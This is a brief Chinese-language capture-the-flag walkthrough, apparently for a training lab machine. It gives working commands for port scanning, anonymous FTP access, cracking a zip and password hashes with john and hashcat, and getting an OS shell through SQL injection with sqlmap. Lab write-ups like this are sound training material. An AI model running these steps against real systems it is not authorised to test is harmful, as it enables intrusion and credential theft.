1. nmap扫描
> map -A -sV 10.129.194.163
> 22 ssh 21 ftp 80 http

2. 匿名访问ftp获得备份文件 anonymous
3. 利用zip2john 和 john解密zip,并找到web页面的登录密码
4. 解密hash
> hashcat -a 0 -m 0 test.txt /usr/share/wordlists/rockyou.txt
5. 利用sql注入和反弹shell获取webshell
> sqlmap -u "http://10.129.194.163/dashboard.php?search=f" --cookie="PHPSESSID=4h3a937f4hobqtlb4v0o3iposd" --os-shell

   
